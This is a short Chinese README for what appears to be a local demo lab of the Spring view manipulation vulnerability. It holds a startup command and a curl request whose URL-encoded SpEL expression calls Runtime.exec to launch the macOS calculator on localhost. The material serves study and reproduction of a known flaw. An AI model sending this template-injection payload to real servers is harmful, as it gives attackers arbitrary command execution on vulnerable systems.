参考文章

* https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability

启动springboot


```
mvn spring-boot:run
```

测试方法

```
curl 'http://127.0.0.1:8080/path?lang=__%24%7BT(java.lang.Runtime).getRuntime().exec(%27%6F%70%65%6E%20%2F%53%79%73%74%65%6D%2F%41%70%70%6C%69%63%61%74%69%6F%6E%73%2F%43%61%6C%63%75%6C%61%74%6F%72%2E%61%70%70%27)%7D__::.xx'
```
